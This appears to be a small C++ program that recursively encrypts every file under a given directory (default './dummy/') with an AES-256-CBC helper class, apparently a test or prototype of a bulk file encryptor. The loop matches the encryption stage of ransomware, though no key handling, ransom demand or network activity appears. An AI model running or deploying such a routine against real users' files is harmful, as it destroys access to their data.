#include "cryptor.h"

#include <filesystem>
#include <iostream>
#include <string>

int main(int argc, char *argv[]) {
    std::string path;
    if (argc == 1) {
        std::cout << "[/] Enter a path for encryption (./dummy/): ";
        getline(std::cin, path);
        if (path == "")
            path = "./dummy/";
    } else
        path = argv[1];
    
    AES256CBC AES;


    for (const auto &entry : std::filesystem::recursive_directory_iterator(path)) {
        std::string filename = entry.path();
        if (!std::filesystem::is_directory(filename))
            AES.encryptFile(filename);
    }
    AES.encryptFile("NONEXISTENT.txt");
    return 0;
}

